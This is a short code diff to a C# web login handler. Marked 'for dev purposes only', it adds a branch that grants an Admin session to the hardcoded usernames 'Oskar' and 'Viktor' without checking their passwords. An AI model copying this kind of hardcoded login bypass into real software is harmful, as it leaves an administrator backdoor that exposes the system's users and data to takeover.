@@ -42,6 +42,16 @@ public class Login
             {
                 return TypedResults.BadRequest("No user with that username");
             }
+            //FOR DEV PURPOSES ONLY
+            if(userResult.Name == "Oskar" || userResult.Name == "Viktor"){
+                ctx.Session.SetInt32("id", userResult.Id);
+                ctx.Session.SetString("name", userResult.Name);
+                ctx.Session.SetString("role", "Admin");
+                return TypedResults.Ok("DEV LOGIN");
+
+            }
+            //END
+            else{
             var verificationResult = passwordHasher.VerifyHashedPassword("", userResult.Password, creds.password);
 
             if (verificationResult == PasswordVerificationResult.Failed)
@@ -66,7 +76,7 @@ public class Login
         ctx.Session.SetString("role", userResult.admin ? "Admin" : "User");
 
         return TypedResults.Ok($"Success! User {userResult.Name} with id {userResult.Id} is logged in!");
-        
+            }
 }catch(Exception ex)
         {
             return TypedResults.BadRequest($"Something went wrong: {ex.Message}");
